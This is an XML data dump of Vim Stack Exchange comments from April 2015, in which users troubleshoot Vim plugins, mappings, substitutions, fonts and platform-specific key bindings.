  <row Id="3185" PostId="3021" Score="0" Text="I can not reproduce with Vim 7.4 patches 1-622 using `vim -u NONE`. I would recommend you disable your plugins and vimrc customization until you find the culprit. protip: use a binary search to make it quicker." CreationDate="2015-04-21T21:01:47.597" UserId="778" />
  <row Id="3186" PostId="3025" Score="0" Text="&quot;files&quot;, &quot;lines&quot;, something else? Please fix your question." CreationDate="2015-04-22T07:33:15.573" UserId="54" />
  <row Id="3187" PostId="3023" Score="0" Text="You should send Bram a bug report via the vim_use or vim_dev mailing list." CreationDate="2015-04-22T07:47:50.297" UserId="54" />
  <row Id="3188" PostId="3025" Score="0" Text="Sorry, first line of file. Fixed question." CreationDate="2015-04-22T08:30:00.447" UserId="1820" />
  <row Id="3189" PostId="3026" Score="0" Text="I've edited my question to clarify that I'd like to search in 1st line of files matching a pattern, and replace it with something else. Sorry for the confusion." CreationDate="2015-04-22T09:24:42.747" UserId="1820" />
  <row Id="3190" PostId="3026" Score="0" Text="I've augmented my answer, is that what you wanted?" CreationDate="2015-04-22T10:52:28.393" UserId="1296" />
  <row Id="3191" PostId="3023" Score="0" Text="Good to know that. By comparing `matchparen.vim` between Vim 7.3 and 7.4, I am able to narrowing this to `save_cursor` variable used in the file. Rather than disabling autocmd, you can instead replace `let save_cursor = getcurpos()` and `call setpos('.', save_cursor)` with `let save_cursor = winsaveview()` and `call winrestview(save_cursor)` respectively. This way you don't loose the parenthesis pair highlighting." CreationDate="2015-04-22T12:28:22.577" UserId="1782" />
  <row Id="3192" PostId="3028" Score="6" Text="Use the `c` flag for &quot;confirmation&quot;: `%s/variable/m_&amp;/gc`." CreationDate="2015-04-22T14:20:49.850" UserId="54" />
  <row Id="3193" PostId="3023" Score="0" Text="I can't imagine why `getcurpos()` wouldn't work. In any case, a reproducable example of the problem should be posted to the vim-dev mailinglist, so Bram can fix the plugin." CreationDate="2015-04-22T18:05:43.783" UserId="71" />
  <row Id="3194" PostId="3035" Score="0" Text="Didn't quite work. My configuration (and maybe its different than yours) of exchange.vim doesn't move the cursor to the `)` after the first sequence but rather leaves it at the beginning. I had to move two words (the  'x' and '(' ) and then apply. So basically `cx%2w.`" CreationDate="2015-04-22T19:03:09.993" UserId="895" />
  <row Id="3195" PostId="3035" Score="0" Text="Oops. To tell the truth, I didn't try this before posting. A more reliable way would be to type `%` again. I'll update the answer." CreationDate="2015-04-22T19:05:45.103" UserId="64" />
  <row Id="3196" PostId="3035" Score="0" Text="Using the `.` method should use `%` as exchange.vim is setup to use the same cut mechanism when triggered this way." CreationDate="2015-04-22T19:07:36.897" UserId="895" />
  <row Id="3197" PostId="3035" Score="0" Text="Ooh, that's clever! Updating the answer again haha" CreationDate="2015-04-22T19:09:20.980" UserId="64" />
  <row Id="3198" PostId="3035" Score="0" Text="Wait, that leaves the parentheses intact. Not what the OP asked for." CreationDate="2015-04-22T19:14:19.410" UserId="64" />
  <row Id="3199" PostId="3035" Score="0" Text="Think you need to move two words/characters over (cursor over the `y`)." CreationDate="2015-04-22T19:17:38.133" UserId="895" />
  <row Id="3200" PostId="3035" Score="0" Text="That would work for the specific example OP gave, but it's not a general solution to the question asked." CreationDate="2015-04-22T19:19:36.490" UserId="64" />
  <row Id="3201" PostId="3032" Score="0" Text="This looks good, but I can't seem to figure out a command that works for excluding the undo files. I tried `let g:netrw_list_hide= '.*\.un~$'` and it doesn't work." CreationDate="2015-04-22T19:51:51.260" UserId="226" />
  <row Id="3202" PostId="3026" Score="0" Text="I believe @ayutheos wants to find `^++` only when it appears in the first line in the file, not find the first occurrence of a line that matches `^++`." CreationDate="2015-04-22T20:25:41.077" UserId="343" />
  <row Id="3203" PostId="3026" Score="0" Text="I think therefore that `:argdo 1s/^++/--/e` should suffice." CreationDate="2015-04-22T20:38:49.800" UserId="343" />
  <row Id="3204" PostId="3039" Score="0" Text="I was not aware of the zoom anchors.   Thanks for explaining them." CreationDate="2015-04-22T21:21:21.657" UserId="865" />
  <row Id="3205" PostId="3015" Score="0" Text="@romainl and you deserve an award for the teacher of the year. I wrote my own function to handle my problem, is my first time using vimscript and I wanted to go further by asking. I admit I should have looked the help pages like in any other language, but guess what, I didn't know the help pages were that well documented and sorry for not typing the right words on google to get to your post. I appreciate the content of your answer, but not the way you wrote it. -1" CreationDate="2015-04-23T00:22:15.223" UserId="1690" />
  <row Id="3206" PostId="3026" Score="0" Text="@Rich Yes, that's what I wanted, thanks for clarifying :) . I found that both solutions given by kenorb and PhillipFrank worked (vimgrep gives a quicklist, while argdo substitutes all files in arglist). Thank you!" CreationDate="2015-04-23T05:29:14.070" UserId="1820" />
  <row Id="3207" PostId="3025" Score="0" Text="Both answers given by kenorb &amp; PhillipFrank worked, I was able to use argdo to find and substitute all occurrences, and vimgrep to check which files have been changed. I've marked one to close this question, but both solutions work. Thank you!" CreationDate="2015-04-23T05:35:30.517" UserId="1820" />
  <row Id="3208" PostId="3023" Score="0" Text="Probably related to this: https://groups.google.com/forum/#!topic/vim_dev/CMAGD6obzKo" CreationDate="2015-04-23T06:57:02.177" UserId="1782" />
  <row Id="3209" PostId="3023" Score="0" Text="That is a fixed by 7.4.578 (probably that's why I can't reproduce it), So please try with a newer Vim." CreationDate="2015-04-23T09:36:49.793" UserId="71" />
  <row Id="3210" PostId="3046" Score="5" Text="For terminology, just refer to the very comprehensive `:help`. For an introduction / overview of Vim, there are tons of web pages, vimcasts.org, or even a number of books." CreationDate="2015-04-23T13:45:31.820" UserId="970" />
  <row Id="3212" PostId="2608" Score="0" Text="@JustinM.Keyes The buffer list is a superset of the args list, so that's expected." CreationDate="2015-04-23T14:34:22.513" UserId="15" />
  <row Id="3214" PostId="3038" Score="0" Text="No, I actually want NERDTree to open the file in the current tab and only the current tab, without switching to an existing open buffer in a different tab.&#xA;&#xA;What T does is open the file in a new tab." CreationDate="2015-04-23T20:28:16.853" UserId="333" />
  <row Id="3215" PostId="3049" Score="0" Text="I checked my formatoptions. It is set as 'tcroql'. Sorry if my question was not clear enough. I have no issues with auto-formatting. I would just like it to be &quot;paused&quot; when I am using visual mode, and resume after I exit it." CreationDate="2015-04-24T04:02:21.540" UserId="230" />
  <row Id="3216" PostId="3049" Score="0" Text="Interesting, I don't see wrapping under such circumstances. Does my solution work when you do `:setl fo-=c fo-=t` instead of `:setl fo-=a`? You could also `:set paste` ... `:set nopaste` instead." CreationDate="2015-04-24T07:25:02.217" UserId="970" />
  <row Id="3217" PostId="3038" Score="0" Text="Yes! Sorry I didn't get it the first time; however, this is not implemented by default in NERDTree. By default NERDTree will switch you to the file if it already exist. Which is - to most of us -  is the natural required behavior of any editor. According to my experience with NERDTree and its complement NERDTreeTabs (NERDTreeTabs makes NERDTree tab-aware, you have to install them both), you can have the same file open in multiple tab. Right now I can open a file in multiple tabs using T and t, but I have to explicitly tell NERDTree to do that." CreationDate="2015-04-24T08:18:13.087" UserId="1832" />
  <row Id="3218" PostId="3057" Score="0" Text="I do not use ex copy enough, good suggestion." CreationDate="2015-04-24T14:25:13.837" UserId="895" />
  <row Id="3219" PostId="3049" Score="0" Text="I think that what he is doing is pressing `A` in a visual block. I see the same behavior on my side. It should be possible to remap `A` in such conditions to save and reset `tw`, as you did with `fo`." CreationDate="2015-04-24T18:09:09.247" UserId="599" />
  <row Id="3220" PostId="3049" Score="0" Text="@Vitor: Thanks, I think I really misunderstood. Yes, such remap is possible, if somewhat more complex. I've added that." CreationDate="2015-04-24T18:44:43.357" UserId="970" />
  <row Id="3221" PostId="3061" Score="0" Text="Well, you a right about `synIDattr()`. I tried the following example: `:echo synIDattr(synIDtrans(synID(line(&quot;.&quot;), col(&quot;.&quot;), 1)), &quot;bg&quot;)`.&#xA;It returns nothing on regular text." CreationDate="2015-04-24T19:26:22.313" UserId="1860" />
  <row Id="3222" PostId="3062" Score="0" Text="The second command worked, although it still prints output on the screen. Additionally, I don't need to press Enter when the script ends anymore, which is good. But I wonder if there is any way to totally suppress the output." CreationDate="2015-04-24T19:44:59.130" UserId="1837" />
  <row Id="3223" PostId="3062" Score="0" Text="Does replacing `execute &quot;!./make.sh&quot;` with `execute &quot;!./make.sh &gt;/dev/null 2&gt;&amp;1&quot;` help?  This redirects all output of the command to `/dev/null`.  Read http://www.tldp.org/LDP/abs/html/io-redirection.html for more information on redirection in bash." CreationDate="2015-04-24T19:56:23.890" UserId="865" />
  <row Id="3224" PostId="3062" Score="0" Text="I should have thought of that! It works. Thanks!" CreationDate="2015-04-24T19:59:55.913" UserId="1837" />
  <row Id="3226" PostId="209" Score="0" Text="Is there a way to do this *without* setting `mouse=a`? I don't want accidental clicks messing up my editing flow." CreationDate="2015-04-24T23:23:32.960" UserId="142" />
  <row Id="3227" PostId="3064" Score="0" Text="I thought about `:make` while I was answering this, but I didn't include it.  It is a better idea to use make fore compiling things." CreationDate="2015-04-25T00:21:06.830" UserId="865" />
  <row Id="3228" PostId="3059" Score="0" Text="Beware that there's a (small but non-zero) runtime price to each `matchadd()`.  Perhaps a better approach might be to keep a list of IDs and delete the relevant ones rather than make them do nothing." CreationDate="2015-04-25T04:47:05.390" UserId="1577" />
  <row Id="3229" PostId="3067" Score="1" Text="This will operate on the last open buffer, which isn't *exactly* what I wanted, but since it doesn't quit, it's good enough for my purposes." CreationDate="2015-04-25T05:23:22.273" UserId="920" />
  <row Id="3230" PostId="3059" Score="0" Text="@lcd047 I would like to do it this way, but the issue is that pattern, that should be ignored actually have a subpattern that should be highlighted in all other places except matching ignored one (e.g. `\s\+$` and `&gt;\s\+\$` that should be ignored)." CreationDate="2015-04-25T05:44:10.443" UserId="1860" />
  <row Id="3232" PostId="3073" Score="0" Text="Does not do anything in normal mode exept beeping and in insert mode somehow triggers completion. :/" CreationDate="2015-04-25T14:37:06.997" UserId="1869" />
  <row Id="3233" PostId="3072" Score="3" Text="An alternative to `Esc` key that is more 'reachable' is `Ctrl-[`" CreationDate="2015-04-25T15:58:22.127" UserId="1782" />
  <row Id="3234" PostId="3067" Score="0" Text="The vim-bbye plugin might be what you're looking for: https://github.com/moll/vim-bbye" CreationDate="2015-04-25T17:08:31.133" UserId="67" />
  <row Id="3236" PostId="3072" Score="0" Text="Why would &lt;Nul&gt; be a ctrl-space?" CreationDate="2015-04-25T23:38:55.977" UserId="1094" />
  <row Id="3237" PostId="3073" Score="1" Text="Do you have existing mappings for c-space? These should work, I think, unless your vim is not recognizing the keystroke." CreationDate="2015-04-25T23:40:57.193" UserId="1094" />
  <row Id="3238" PostId="3076" Score="2" Text="Have you looked at http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim?" CreationDate="2015-04-26T03:32:12.220" UserId="205" />
  <row Id="3239" PostId="3078" Score="2" Text="I use Arch Linux, and `has('clipboard')` in `vim` works fine. You *do* need to install the `gvim` package to get a Vim linked to libX11; but you don't need to use `gvim`." CreationDate="2015-04-26T08:24:32.603" UserId="51" />
  <row Id="3242" PostId="3080" Score="0" Text="Right from the source, thank you!" CreationDate="2015-04-26T11:07:56.483" UserId="1787" />
  <row Id="3243" PostId="3072" Score="0" Text="Control-Space is a potentially difficult thing, since it's a signal which differnt TERMs send differently. It can be &lt;C-Space&gt; or &lt;NUL&gt;, if it's sent at all." CreationDate="2015-04-26T19:50:48.903" UserId="130" />
  <row Id="3244" PostId="3079" Score="0" Text="So simple and elegant solution! Only I'd rather `mkdir ~/Dropbox/vim &amp;&amp; mv ~/.vim/spell ~/Dropbox/vim/` instead of `rmdir` :)" CreationDate="2015-04-26T19:59:04.090" UserId="418" />
  <row Id="3245" PostId="3075" Score="0" Text="That's strange to me that with `:set spellfile=&lt;list of .add files in ~/.vim/spell&gt;` Vim will work differently than if I would leave `'spellfile'` empty. Vim will work with exactly the same set of files but would threat them differently. Was it implemented this way intentionally with some specific use case in mind?" CreationDate="2015-04-26T20:06:45.857" UserId="418" />
  <row Id="3246" PostId="3085" Score="0" Text="Hmmm. It works, but I don't understand how the documentation relates to the behavior — the description of `o` even explicitly states that it applies to `:wn`. What kind of messages might `O` overwrite? I don't care about the message that a file has been successfully written, but don't want to miss important messages, like failing to write a file." CreationDate="2015-04-26T21:52:26.303" UserId="8" />
  <row Id="3247" PostId="3073" Score="0" Text="Should work for most modern terminals, however you can also map `&lt;C-@&gt;`like @tivn suggests, that works as well, the reason being both send the same key codes to vim." CreationDate="2015-04-26T23:05:52.173" UserId="74" />
  <row Id="3249" PostId="3088" Score="0" Text="Would this be faster than @Carpetsmoker's answer?" CreationDate="2015-04-26T23:52:14.590" UserId="865" />
  <row Id="3250" PostId="3088" Score="0" Text="@EvergreenTree Probably, yes. But I suspect the difference will be minimal (probably unmeasurable) in most circumstances. Go for the solution you find the most readable." CreationDate="2015-04-27T00:00:03.250" UserId="51" />
  <row Id="3251" PostId="3088" Score="0" Text="I've no idea. carpetsmoker's trick with `index+map` would probably be faster than the loop (that I use on my library). However, the `join()` trick has good chances to be the faster one. Moreover, you can precompute the regex if the list of filetypes doesn't change." CreationDate="2015-04-27T00:17:27.360" UserId="626" />
  <row Id="3252" PostId="3089" Score="0" Text="Do you use tmux?" CreationDate="2015-04-27T07:38:54.323" UserId="54" />
  <row Id="3253" PostId="3089" Score="0" Text="@romainl yes, the error occurs both inside and outside of tmux though" CreationDate="2015-04-27T07:52:41.287" UserId="1842" />
  <row Id="3254" PostId="3091" Score="0" Text="it doesn't work for me. When I press `C-X` it exits complete mode and then when I press `C-L` it inserts these 2 characters: `^L`" CreationDate="2015-04-27T11:16:47.423" UserId="1881" />
  <row Id="3255" PostId="3091" Score="0" Text="That sounds like you're hitting `&lt;C-V&gt;` instead of `&lt;C-X&gt;`. Do you have any Insert mappings that might be affecting this behaviour?" CreationDate="2015-04-27T11:23:10.747" UserId="64" />
  <row Id="3256" PostId="3091" Score="0" Text="Actually, I just confirmed that `&lt;C-L&gt;` in Insert mode will insert `^L`, so there's no `&lt;C-V&gt;` necessary as for some other chords. Still bizarre though, this works just fine for me." CreationDate="2015-04-27T11:25:19.707" UserId="64" />
  <row Id="3257" PostId="3091" Score="0" Text="I have the YouCompleteMe plugin. Some settings I have: `:set wildmode=list:longest` `let g:ycm_confirm_extra_conf = 0` `let g:ycm_complete_in_comments = 1` `let g:ycm_autoclose_preview_window_after_insertion = 1`" CreationDate="2015-04-27T11:28:40.580" UserId="1881" />
  <row Id="3258" PostId="3089" Score="2" Text="I would recommend using MacVim instead, as it plays better in Mac OS. You don't have to use the GUI version -- `mvim -v` will work in the terminal." CreationDate="2015-04-27T11:30:06.187" UserId="64" />
  <row Id="3259" PostId="3091" Score="0" Text="I don't know anything about the plugin. Have you tested this with no plugins installed? Use `vim -u NONE -N`. If it works there, try a minimal setup where only that plugin is installed (nothing else in your vimrc). If that breaks it again, I'd be pretty confident that the plugin is the problem." CreationDate="2015-04-27T11:33:01.333" UserId="64" />
  <row Id="3260" PostId="3091" Score="0" Text="it works with `vim -u NONE -N`. So it is from a plugin or from a setting. When I'll have a little time I'll narrow it and come back with the finds. Thank you for your time." CreationDate="2015-04-27T11:39:29.547" UserId="1881" />
  <row Id="3261" PostId="3090" Score="1" Text="it looks like it works on default settings. There is a plugin/setting of mine that breaks this. I'll edit the question / add an answer when I find out the one that breaks this." CreationDate="2015-04-27T11:41:34.393" UserId="1881" />
  <row Id="3262" PostId="3086" Score="2" Text="There's a flaw in what you're trying to do. You're using globs, but treating them as regular expressions. As a regular expression, `git*` matches `gi`, `git`, `gitt`, etc. This is easily fixed by using `git.*` instead. Be careful not to use glob syntax, as is common when looking at file names and file types." CreationDate="2015-04-27T12:36:52.730" UserId="64" />
  <row Id="3263" PostId="3093" Score="4" Text="[`:help 'guifont'`](http://vimhelp.appspot.com/options.txt.html#E596) should have the information you need. Also see [How do I navigate to topics in Vim's documentation?](http://vi.stackexchange.com/questions/2136/how-do-i-navigate-to-topics-in-vims-documentation?s=1|0.0000), [Quickly switch between fonts at runtime](http://vi.stackexchange.com/questions/663/quickly-switch-between-fonts-at-runtime?rq=1), [How to display Font Awesome in Vim?](http://vi.stackexchange.com/questions/2566/how-to-display-font-awesome-in-vim?rq=1)." CreationDate="2015-04-27T20:24:54.827" UserId="51" />
  <row Id="3265" PostId="3094" Score="1" Text="Note that the `name:size` syntax *only* works on Windows gVim, for gtk gVim you need to use `name size` (a space between the font name &amp; size) ... Other platforms may have other formats..." CreationDate="2015-04-27T22:14:40.877" UserId="51" />
  <row Id="3266" PostId="3094" Score="0" Text="`:hXX` works on the Mac as well. Good point about GTK though." CreationDate="2015-04-27T22:31:37.993" UserId="72" />
  <row Id="3267" PostId="3092" Score="0" Text="It's common to disable the following of symbolic links when searching for files recursively to avoid infinite loops. Imagine `ln -s . self`" CreationDate="2015-04-28T01:18:32.350" UserId="64" />
  <row Id="3268" PostId="3092" Score="0" Text="I have several other dotfiles that are symlinked in a similar manner in the same location and all of those show up. The symlinks are in ~ and the actual files are in ~/.dotfiles. I use Unite from ~/.dotfiles." CreationDate="2015-04-28T01:21:46.070" UserId="200" />
  <row Id="3269" PostId="3085" Score="0" Text="@Gilles Hm, I'm also slightly confused now ... I need to do some more digging and see how exactly this works ... stay tuned ..." CreationDate="2015-04-28T08:43:34.757" UserId="51" />
  <row Id="3270" PostId="3058" Score="0" Text="Your answer is probably the correct one to my question, but tivn's answer feels more like the vim-way of accomplishing what I need to do. Thanks anyway!" CreationDate="2015-04-28T10:00:10.287" UserId="1854" />
  <row Id="3271" PostId="3101" Score="0" Text="Thanks. Exactly what I needed, and I appreciate the &quot;teach a man how to fish...&quot;-style tip on where to get further help in the future." CreationDate="2015-04-28T12:25:07.803" UserId="1882" />
  <row Id="3272" PostId="3100" Score="0" Text="Thanks for the answer. `NonText` was what I needed. I found the snippet didn't work, though `hi NonText ctermbg=NONE` did as per @Carpetsmoker's answer." CreationDate="2015-04-28T12:27:18.590" UserId="1882" />
  <row Id="3273" PostId="3100" Score="0" Text="@Coljac I'm confused. Isn't that exactly what I have written?" CreationDate="2015-04-28T12:43:16.060" UserId="205" />
  <row Id="3274" PostId="3100" Score="0" Text="Apologies for the cut and paste error. It was `:highlight clear NonText` that worked (from vim) - though knowing &quot;NonText&quot; I was able to edit the colorscheme easily enough." CreationDate="2015-04-28T12:50:22.697" UserId="1882" />
  <row Id="3275" PostId="3100" Score="0" Text="@Coljac Muru's example had a minor typo: it was `ctermbg`, but should be `ctermfg` (I've fixed this now)." CreationDate="2015-04-28T12:52:34.690" UserId="51" />
  <row Id="3276" PostId="3100" Score="0" Text="@Carpetsmoker if that works, colour me surprised. I thought `fg` applied to the text." CreationDate="2015-04-28T12:55:49.840" UserId="205" />
  <row Id="3277" PostId="2982" Score="0" Text="@jecxjo a function might be interesting to see - and probably the best solution that I didn't consider as I can't write them (on todo list). I'll update the OP to match if so, cheers." CreationDate="2015-04-28T13:42:23.837" UserId="1443" />
  <row Id="3278" PostId="476" Score="0" Text="See also: [How does the vim “write with sudo” trick work?](http://stackoverflow.com/q/2600783/55075)" CreationDate="2015-04-28T13:51:27.083" UserId="467" />
  <row Id="3279" PostId="2984" Score="0" Text="Just had chance to go through this, didn't think of creating a new split to work in that's cool :)&#xA;&#xA;I had to change some of the mappings for it to work though. &#xA;Going from the `c&lt;cr&gt;%&lt;space&gt;` line: &#xA;&#xA;    `c&lt;cr&gt;%&lt;space&gt; THEN &lt;esc&gt;`&#xA;    `/\&lt;cr&gt;`&#xA;    `i&lt;del&gt;&lt;cr&gt;`&#xA;    `o&lt;esc&gt;j`&#xA;&#xA;Perhaps I've missed something on your post, it didn't seem to work for&#xA;me though. I guess mapping the whole thing to a macro isn't really doable, a function would probably be easier. cheers :) (clicking &quot;edit&quot; on this comment might make it clearer to see the steps)" CreationDate="2015-04-28T13:53:19.357" UserId="1443" />
  <row Id="3280" PostId="2984" Score="0" Text="You're right, I forgot to leave insert mode after that change command. I tried this out in vim before writing and did get it working as a macro, but must have made some errors while transcribing it here." CreationDate="2015-04-28T14:02:13.820" UserId="680" />
  <row Id="3281" PostId="2984" Score="1" Text="Just tried it again and fixed the two bugs (added `&lt;esc&gt;`, switched forward slash to backslash). FWIW, the raw contents of my a register after recording the macro were `I% ^[f#hvgelc^M% ^[f\hr^Mo^[j`" CreationDate="2015-04-28T14:10:51.227" UserId="680" />
  <row Id="3283" PostId="3024" Score="0" Text="Can you post a simple example document which doesn't work well with TeX? Adding a basic equation doesn't seem to give any problems." CreationDate="2015-04-28T15:12:24.287" UserId="51" />
  <row Id="3284" PostId="3104" Score="0" Text="That's useful, thank you for sharing!" CreationDate="2015-04-28T17:30:38.317" UserId="602" />
  <row Id="3285" PostId="3104" Score="1" Text="According to [this answer](http://vi.stackexchange.com/a/2577/51), `has('unix')` is often true on OSX systems, and [according to John here](https://vi.stackexchange.com/questions/3093/how-can-i-change-the-font-size-in-gvim/3104#comment3266_3094), OSX requires the same format as Windows... So using `has('gui_gtk2')` is probably better than using `has('unix')`." CreationDate="2015-04-28T17:30:45.533" UserId="51" />
  <row Id="3299" PostId="3098" Score="0" Text="In fact this actually work. THANKS!. But I wonder if the &quot;default&quot; behaviour can be modified without doing this. That is, VIM without &quot;n&quot; in ```formatoptions``` already recognize some numbered list formats. Is that hardcoded in the code?" CreationDate="2015-04-28T22:39:33.570" UserId="1890" />
  <row Id="3300" PostId="3108" Score="2" Text="`^D` will leave the whitespace alone." CreationDate="2015-04-28T23:13:40.803" UserId="865" />
  <row Id="3301" PostId="3098" Score="0" Text="@jcea It doesn't work with me when I test it with `1. ` ...  Perhaps this is something in your specific filetype?" CreationDate="2015-04-28T23:44:03.977" UserId="51" />
  <row Id="3302" PostId="3109" Score="0" Text="The best tags I could think of for the question do not exist: [tag:selection] and [tag:range] so feel free to re-tag or create one of those tags." CreationDate="2015-04-29T01:33:34.787" UserId="878" />
  <row Id="3303" PostId="3105" Score="1" Text="As an alternative to trimming whitespace manually, you could use a plugin such as [vim-better-whitespace](https://github.com/ntpeters/vim-better-whitespace), which highlights trailing whitespace, provides a command to remove it all at once, and can even do it automatically on save." CreationDate="2015-04-29T01:39:49.510" UserId="757" />
  <row Id="3304" PostId="3105" Score="0" Text="See also [What's the simplest way to strip trailing whitespace from all lines in a file?](http://vi.stackexchange.com/questions/454/whats-the-simplest-way-to-strip-trailing-whitespace-from-all-lines-in-a-file)." CreationDate="2015-04-29T01:46:07.193" UserId="757" />
  <row Id="3305" PostId="3110" Score="1" Text="Is `&lt;C-A&gt;` control+a? That selects everything in Vim on Windows." CreationDate="2015-04-29T02:43:45.477" UserId="878" />
  <row Id="3306" PostId="3110" Score="0" Text="It is Control+a. In vim it should increment a number. If you have changed your keybindings to do Windows actions instead of Vim actions then your not going to be able to do most of the things people post here." CreationDate="2015-04-29T02:45:36.487" UserId="895" />
  <row Id="3307" PostId="3110" Score="0" Text="No the Vim version for Windows comes with different bindings due to somebody's infinite wisdom. I'm just using the vanilla out-of-the-box bindings. I've never changed a Vim key binding in over twenty years, that I can recall (-:" CreationDate="2015-04-29T02:47:23.980" UserId="878" />
  <row Id="3308" PostId="3110" Score="0" Text="Shouldn't be the case, my Windows install has normal vim bindings. Could it be possible you installed someone else's build of vim? Or could you be running vim in &quot;Easy&quot; mode? i believe windows installs desktop icons with normal and easy mode options." CreationDate="2015-04-29T02:50:36.190" UserId="895" />
  <row Id="3309" PostId="3110" Score="0" Text="Oh &quot;easy mode&quot; could be a possibility. I always install the &quot;official&quot; Windows Vim. Now to find out how to know whether I've got easy mode or not." CreationDate="2015-04-29T02:52:22.497" UserId="878" />
  <row Id="3310" PostId="3110" Score="3" Text="No, its because the default install in windows loads mswin.vim. If you make your own vimrc and not load mswin.vim then you get the normal vim bindings. I keep a single vimrc for all my installs (Linux, Mac and Windows) and never deal with mswin.vim. For more info on this issue see http://stackoverflow.com/questions/289681/why-does-c-a-ctrla-not-work-under-gvim-on-windows" CreationDate="2015-04-29T02:53:40.880" UserId="895" />
  <row Id="3311" PostId="3110" Score="0" Text="Aha. I prefer not to customize my Vim because I often download and install it on some computer temporarily where I won't have my customizations so I ditched them and decided just to learn the vanilla way to do things some years back. It is annoying that there is a different vanilla for different OSes but it can also be annoying when a key combo that works on every Windows app doesn't work in Vim so I can see why they did it." CreationDate="2015-04-29T02:57:10.967" UserId="878" />
  <row Id="3312" PostId="3110" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/23274/discussion-between-jecxjo-and-hippietrail)." CreationDate="2015-04-29T02:59:39.773" UserId="895" />
  <row Id="3315" PostId="3103" Score="1" Text="Note that `.exrc` are extremely limited: the *project* notion stops at the current directory, i.e. files in subdirectories don't belong to the project." CreationDate="2015-04-29T07:44:24.470" UserId="626" />
  <row Id="3316" PostId="3114" Score="0" Text="But doesn't `line(&quot;.&quot;)` mean &quot;use the current line number&quot;? That was my problem **1.** with previous answers I could find." CreationDate="2015-04-29T08:19:35.817" UserId="878" />
  <row Id="3317" PostId="3114" Score="1" Text="Yes it is. That's why I subtract the line number of the first line in the range." CreationDate="2015-04-29T08:20:51.153" UserId="626" />
  <row Id="3318" PostId="3114" Score="0" Text="Ah OK I haven't tested it yet because I can't even remember how to enter a script in Vim ... gotta read up on that first (-:" CreationDate="2015-04-29T08:23:54.347" UserId="878" />
  <row Id="3319" PostId="3114" Score="1" Text="As you're under windows, copy paste the code into `$HOME/vimfiles/plugin/whatevernameyouwish.vim`. Or even your `$HOME/_vimrc` (windows filename) if your prefer (in a first time).  If you're not sure what $HOME is on your machine, ask vim what it thinks it is -&gt; `:echo $HOME`" CreationDate="2015-04-29T08:27:47.530" UserId="626" />
  <row Id="3320" PostId="3114" Score="0" Text="OK works great! ... I remember years ago scouring the docs and hunting the internet trying to figure out how to execute a script, would never have guessed `:source` (-:" CreationDate="2015-04-29T08:29:04.617" UserId="878" />
  <row Id="3321" PostId="3114" Score="1" Text="You don't even need `:source` if the vim script is correctly installed in the right directory ({rtp}/plugin, or {rtp}/ftplugin/{filetype}/ftplugin for filetype specific plugins). `:source` is what we had to play with more than a decade and a half ago." CreationDate="2015-04-29T08:35:45.673" UserId="626" />
  <row Id="3322" PostId="3114" Score="0" Text="Ah thanks. I worked out quicker to save it anywhere with a `.vim` extension and then `:source` it than to save it in the `plugin` dir." CreationDate="2015-04-29T08:54:20.360" UserId="878" />
  <row Id="3323" PostId="3116" Score="1" Text="This works brilliantly, thanks for including an explanation of what the tags mean rather than just the text I needed to write." CreationDate="2015-04-29T10:21:48.190" UserId="131" />
  <row Id="3324" PostId="3118" Score="0" Text="Great answer, especially with why regex != regex. As for your search and replace, it's a bit tricky as the comment may or may not have a `:`. See the full file for details https://github.com/squarefrog/dotfiles/blob/master/osx/setup_defaults.sh" CreationDate="2015-04-29T10:36:41.283" UserId="131" />
  <row Id="3325" PostId="3113" Score="1" Text="If you include the Shift  it's the same and possibly easier." CreationDate="2015-04-29T12:02:21.160" UserId="1125" />
  <row Id="3327" PostId="3113" Score="3" Text="While this is not the &quot;cleanest&quot; solution, it has one advantage: it's exactly one action, and so it's repeatable with the `.` command. In contrast, `0D` (as suggested in the chosen answer) is two actions: the `0` motion and the `D` command." CreationDate="2015-04-29T13:08:26.340" UserId="64" />
  <row Id="3328" PostId="3107" Score="1" Text="While this is direct, to the point, and (probably) the fewest keystrokes, it's not repeatable using the `.` command. For that reason, I think `cc&lt;Esc&gt;` or `S&lt;Esc&gt;` is more attractive if you care about repeating." CreationDate="2015-04-29T13:11:34.020" UserId="64" />
  <row Id="3329" PostId="3120" Score="0" Text="There actually is a way to differentiate these keypresses in some terminal emulators (namely xterm and pangoterm).  The latter does it by default and xterm can be configured to do so." CreationDate="2015-04-29T13:16:51.883" UserId="15" />
  <row Id="3330" PostId="3107" Score="0" Text="That is true.  However, you could record it as a macro and repeat that using `.`." CreationDate="2015-04-29T13:23:59.217" UserId="865" />
  <row Id="3331" PostId="3117" Score="2" Text="I was just thinking of adding this as an answer and then saw yours" CreationDate="2015-04-29T15:27:34.427" UserId="889" />
  <row Id="3332" PostId="3113" Score="0" Text="@Trengot it probably is easier than `0D` for me since I have `jk` mapped to `&lt;Esc&gt;` in my vimrc, so my hands wouldn't even have to leave the home row." CreationDate="2015-04-29T18:23:26.973" UserId="865" />
  <row Id="3333" PostId="3119" Score="0" Text="Related: http://vi.stackexchange.com/questions/2484/remap-not-working-nl-in-appears-in-other-binding with workaround: http://vi.stackexchange.com/a/2520/67" CreationDate="2015-04-29T20:10:23.170" UserId="67" />
  <row Id="3334" PostId="3120" Score="0" Text="@jamessan Thanks; do you happen to have some info on how to do this in xterm?" CreationDate="2015-04-29T20:18:29.200" UserId="51" />
  <row Id="3335" PostId="3108" Score="0" Text="Since `O` leaves you in insert mode, this is equivalent to `cc`, except without auto-indentation....unless your line was already auto-indented." CreationDate="2015-04-29T22:57:18.093" UserId="1060" />
  <row Id="3336" PostId="3105" Score="1" Text="Even without a plugin, you can globally delete trailing whitespace using search-and-replace, e.g. `:%s/\s*$//`" CreationDate="2015-04-29T23:01:19.917" UserId="1060" />
  <row Id="3337" PostId="3108" Score="0" Text="This will behave differently on the last line of the file." CreationDate="2015-04-30T02:41:40.963" UserId="64" />
  <row Id="3338" PostId="3107" Score="0" Text="In general, macros cannot be repeated with `.`. They work as if those keystrokes were entered interactively, so individual commands are treated separately. Using `.` will repeat only the last command in the macro." CreationDate="2015-04-30T02:51:02.270" UserId="64" />
  <row Id="3339" PostId="3121" Score="0" Text="Wow, very encyclopedic. I've only read the first part and feel like I've learned more about Vim just from that than I have in the past few years. This is the kind of answer that makes Stack Exchange better than average Q&amp;A sites and also shows the benefits of having a Vim specific SE." CreationDate="2015-04-30T03:48:06.740" UserId="878" />
